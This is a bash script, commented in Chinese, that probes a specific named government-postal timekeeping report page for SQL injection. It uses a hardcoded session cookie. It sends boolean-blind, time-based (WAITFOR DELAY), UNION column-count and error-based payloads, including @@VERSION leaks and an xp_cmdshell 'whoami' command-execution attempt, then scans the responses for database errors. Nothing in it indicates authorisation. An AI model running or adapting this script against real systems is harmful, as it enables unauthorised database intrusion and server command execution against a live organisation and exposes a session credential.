#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥🔥🔥 SQL注入深度挖掘 - 内容差异分析"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 获取完全干净的基线
echo "[1] 获取多个基线对比..."
for i in 1 2 3; do
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -H "Cookie: $COOKIE" \
        -o "baseline_${i}.html" 2>&1
done

echo "  基线1: $(wc -c < baseline_1.html) bytes"
echo "  基线2: $(wc -c < baseline_2.html) bytes"
echo "  基线3: $(wc -c < baseline_3.html) bytes"

# 检查基线是否一致
if diff baseline_1.html baseline_2.html > /dev/null 2>&1; then
    echo "  ✅ 基线稳定（完全相同）"
    baseline_stable=1
else
    echo "  ⚠️  基线不稳定（每次请求都不同）"
    baseline_stable=0
    echo "  差异:"
    diff baseline_1.html baseline_2.html | head -20
fi

# 2. 布尔盲注 - 精细测试
echo -e "\n[2] 布尔盲注 - 内容差异分析..."

# True条件
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2' AND '1'='1" \
    -H "Cookie: $COOKIE" \
    -o "bool_true.html" 2>&1

# False条件
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2' AND '1'='2" \
    -H "Cookie: $COOKIE" \
    -o "bool_false.html" 2>&1

true_size=$(wc -c < bool_true.html)
false_size=$(wc -c < bool_false.html)
baseline_size=$(wc -c < baseline_1.html)

echo "  基线:    $baseline_size bytes"
echo "  True:    $true_size bytes (差异: $((true_size - baseline_size)))"
echo "  False:   $false_size bytes (差异: $((false_size - baseline_size)))"

if [ $true_size -eq $false_size ]; then
    echo "  ⚠️  True和False响应完全相同 - 可能不是布尔盲注"
else
    echo "  🔥 True和False响应不同！"
    echo ""
    echo "  详细差异:"
    diff bool_true.html bool_false.html | head -30
fi

# 3. 提取实际内容（去除变化部分）
echo -e "\n[3] 提取固定内容部分..."

# 去除ViewState等变化部分，只看实际内容
for file in baseline_1.html bool_true.html bool_false.html; do
    # 提取<span id="lblNote">的内容（错误消息）
    lblnote=$(grep -oE '<span id="lblNote">.*</span>' "$file" 2>/dev/null)
    echo "  $(basename $file): $lblnote"
    
    # 检查是否有SQL错误
    if grep -qi "SQL\|syntax\|error\|exception\|unclosed\|quotation" "$file"; then
        echo "    🔥🔥🔥 发现SQL相关错误!"
        grep -i "SQL\|syntax\|error" "$file" | head -10
    fi
done

# 4. 时间盲注 - 精确计时
echo -e "\n[4] 时间盲注 - 精确计时测试..."

# 安装bc用于精确计算
apt-get install -y bc > /dev/null 2>&1 || yum install -y bc > /dev/null 2>&1

# 正常请求
echo -n "  正常请求: "
start=$(date +%s.%N)
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
    -H "Cookie: $COOKIE" \
    -o normal_timing.html 2>&1
end=$(date +%s.%N)
normal_time=$(echo "$end - $start" | bc -l)
printf "%.3f秒\n" $normal_time

# WAITFOR DELAY 5秒
echo -n "  WAITFOR DELAY 5秒: "
start=$(date +%s.%N)
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2';WAITFOR DELAY '0:0:5'--" \
    -H "Cookie: $COOKIE" \
    -o delay_5s.html 2>&1
end=$(date +%s.%N)
delay_time=$(echo "$end - $start" | bc -l)
printf "%.3f秒\n" $delay_time

time_diff=$(echo "$delay_time - $normal_time" | bc -l)
echo "  时间差异: $(printf "%.3f" $time_diff)秒"

if (( $(echo "$time_diff > 4.5" | bc -l) )); then
    echo "  🔥🔥🔥 时间盲注成功！延迟了约5秒！"
    echo "MAU2';WAITFOR DELAY '0:0:5'--" > sql_time_blind_confirmed.txt
fi

# 5. UNION注入 - 查看实际响应内容
echo -e "\n[5] UNION注入 - 详细内容分析..."

# 测试不同列数
for cols in 1 2 3 4 5; do
    nulls=$(printf "NULL,%.0s" $(seq 1 $cols) | sed 's/,$//')
    payload="MAU2' UNION SELECT ${nulls}--"
    
    echo "  测试 $cols 列:"
    curl -sk "${BASE}/report/inBCC.aspx?ID=${payload}" \
        -H "Cookie: $COOKIE" \
        -o "union_${cols}cols_detailed.html" 2>&1
    
    size=$(wc -c < "union_${cols}cols_detailed.html")
    echo "    大小: $size bytes"
    
    # 检查是否有列数错误提示
    if grep -qi "different number of columns\|All queries combined" "union_${cols}cols_detailed.html"; then
        echo "    🔥 发现列数提示!"
        grep -i "different number of columns\|All queries combined" "union_${cols}cols_detailed.html" | head -5
    fi
    
    # 检查是否返回了数据
    if grep -qi "UNION.*SELECT" "union_${cols}cols_detailed.html"; then
        echo "    ⚠️  payload被反射到响应中"
    fi
    
    # 提取<span id="lblNote">
    lblnote=$(grep -oE '<span id="lblNote">.*</span>' "union_${cols}cols_detailed.html" 2>/dev/null)
    if [ -n "$lblnote" ]; then
        echo "    lblNote: $lblnote"
    fi
done

# 6. 错误注入 - 触发详细错误
echo -e "\n[6] 错误注入 - 触发详细SQL错误..."

ERROR_PAYLOADS=(
    "MAU2'"
    "MAU2''"
    "MAU2'''"
    "MAU2' OR 1=1--"
    "MAU2' OR '1'='1"
    "MAU2' AND 1=CONVERT(INT,@@VERSION)--"
    "MAU2' AND 1=CAST(@@VERSION AS INT)--"
    "MAU2' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
    "MAU2'; SELECT @@VERSION--"
    "MAU2'; EXEC xp_cmdshell('whoami')--"
)

for payload in "${ERROR_PAYLOADS[@]}"; do
    echo "  测试: ${payload:0:40}..."
    curl -sk "${BASE}/report/inBCC.aspx?ID=${payload}" \
        -H "Cookie: $COOKIE" \
        -o "error_$(echo $payload | md5sum | cut -d' ' -f1).html" 2>&1
    
    filename="error_$(echo $payload | md5sum | cut -d' ' -f1).html"
    size=$(wc -c < "$filename")
    
    # 检查SQL错误
    if grep -qi "SQL\|syntax\|microsoft\|ODBC\|OLE DB\|unclosed\|quotation\|varchar" "$filename"; then
        echo "    🔥🔥🔥 SQL错误泄露!"
        grep -i "SQL\|syntax\|microsoft\|ODBC\|unclosed" "$filename" | head -10
        echo ""
    fi
    
    # 检查是否有数据库信息
    if grep -qi "Microsoft SQL Server\|MySQL\|Oracle\|PostgreSQL" "$filename"; then
        echo "    🔥 数据库类型泄露!"
        grep -i "Microsoft SQL Server\|MySQL\|Oracle\|PostgreSQL" "$filename" | head -5
    fi
done

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 SQL注入深度分析完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "🔥 发现的SQL注入:"
ls -lh sql_*_confirmed.txt 2>/dev/null || echo "  无确认的注入"
echo ""
echo "📁 所有测试文件:"
ls -lh baseline_*.html bool_*.html union_*_detailed.html error_*.html 2>/dev/null | head -20
